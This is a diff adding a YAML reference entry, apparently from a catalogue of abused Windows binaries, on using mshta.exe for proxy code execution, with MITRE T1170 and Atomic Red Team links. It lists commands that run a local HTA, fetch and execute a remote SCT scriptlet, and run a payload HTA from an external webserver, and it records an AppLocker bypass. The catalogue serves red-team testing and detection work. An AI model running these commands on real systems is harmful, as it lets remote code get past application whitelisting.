@@ -1,0 +1,44 @@
+---
+Name: 'Mshta.exe'
+Description: 'Used to perform proxy execution of code. VBS/JS code inside hta application.'
+Created: '2018-06-08'
+Commands:
+  - Command: 'mshta.exe C:\poc\evilfile.hta'
+    Description: 'Executes code inside evilfile.hta.'
+  - Command: 'mshta.exe javascript:a=GetObject("script:https://gist.github.com/someone/something.sct").Exec();close();'
+    Description: 'Executes remote SCT file'
+  - Command: 'mshta.exe http://webserver/payload.hta'
+    Description: 'Executes hta file from external webserver'
+Windows Binary: true
+Bypasses Default AppLocker Rules: true
+Notes: ''
+MITRE:
+  - ID: 'T1170'
+    Link: 'https://attack.mitre.org/wiki/Technique/T1170'
+Atomic Red Teaming:
+  - Description: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1170/T1170.md'
+    Code: ''    
+Full path:
+  - Path: 'C:\Windows\System32\mshta.exe'
+  - Path: 'C:\Windows\SysWOW64\mshta.exe'
+Verified on OS:
+  - Windows 10 1803: false
+  - Windows 10 1709: false
+  - Windows 10 1703: false
+  - Windows 10 1607: false
+  - Windows 10 1511: false
+  - Windows 10 1507: false
+  - Windows 8.1: false
+  - Windows 8: false
+  - Windows 7: false
+Resources:
+  - Link: 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1170/T1170.md'
+  - Link: 'https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_4'
+  - Link: 'https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Payloads/mshta.sct'
+  - Link: 'https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/'
+  - Link: 'https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/'
+Acknowledgement:
+  - Name: 'Casey Smith'
+    TwitterHandle: '@Subtee'
+    Blog: 'https://subt0x11.blogspot.com/'
+---
